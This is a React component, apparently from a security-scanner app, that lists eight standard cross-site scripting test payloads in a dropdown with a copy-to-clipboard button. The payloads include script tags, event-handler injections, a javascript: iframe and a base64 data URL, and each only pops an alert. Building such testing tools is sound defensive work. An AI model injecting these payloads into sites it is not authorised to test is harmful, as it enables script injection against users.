
import React, { useState } from 'react';
import { Label } from '@/components/ui/label';
import { Textarea } from '@/components/ui/textarea';
import { Button } from '@/components/ui/button';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { toast } from '@/components/ui/use-toast';
import { Copy, Check } from 'lucide-react';

const XssPayloadsTab: React.FC = () => {
  const [selectedXssPayload, setSelectedXssPayload] = useState('');
  const [copySuccess, setCopySuccess] = useState<string | null>(null);
  
  // XSS Payloads
  const xssPayloads = {
    'basic': `<script>alert('XSS')</script>`,
    'image': `<img src="x" onerror="alert('XSS')">`,
    'svg': `<svg onload="alert('XSS')">`,
    'body': `<body onload="alert('XSS')">`,
    'input': `<input autofocus onfocus="alert('XSS')">`,
    'iframe': `<iframe src="javascript:alert('XSS')"></iframe>`,
    'data': `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">Click me</a>`,
    'data-url': `data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=`
  };
  
  const handleCopyToClipboard = (text: string, type: string) => {
    navigator.clipboard.writeText(text).then(() => {
      setCopySuccess(type);
      setTimeout(() => setCopySuccess(null), 2000);
      toast({
        title: "Copied to clipboard!",
        description: `The ${type} has been copied to your clipboard.`,
      });
    });
  };

  return (
    <div className="space-y-4">
      <div>
        <Label htmlFor="xss-type">XSS Payload Type</Label>
        <Select 
          value={selectedXssPayload} 
          onValueChange={setSelectedXssPayload}
        >
          <SelectTrigger className="bg-scanner-dark-alt border-gray-700">
            <SelectValue placeholder="Select an XSS payload" />
          </SelectTrigger>
          <SelectContent className="bg-scanner-dark border-gray-700">
            {Object.keys(xssPayloads).map((key) => (
              <SelectItem key={key} value={key}>{key}</SelectItem>
            ))}
          </SelectContent>
        </Select>
      </div>
      
      {selectedXssPayload && (
        <div className="mt-4">
          <Label>Generated XSS Payload</Label>
          <div className="relative mt-1.5">
            <Textarea 
              readOnly 
              value={xssPayloads[selectedXssPayload as keyof typeof xssPayloads]}
              className="min-h-24 font-mono text-sm bg-scanner-dark-alt border-gray-700"
            />
            <Button 
              size="sm" 
              variant="outline" 
              className="absolute right-2 top-2 h-8 border-gray-700 hover:bg-scanner-dark-alt"
              onClick={() => handleCopyToClipboard(
                xssPayloads[selectedXssPayload as keyof typeof xssPayloads], 
                'XSS payload'
              )}
            >
              {copySuccess === 'XSS payload' ? (
                <Check className="h-4 w-4" />
              ) : (
                <Copy className="h-4 w-4" />
              )}
            </Button>
          </div>
          <p className="text-gray-400 text-xs mt-2">
            Use this payload to test for Cross-Site Scripting vulnerabilities
          </p>
        </div>
      )}
    </div>
  );
};

export default XssPayloadsTab;
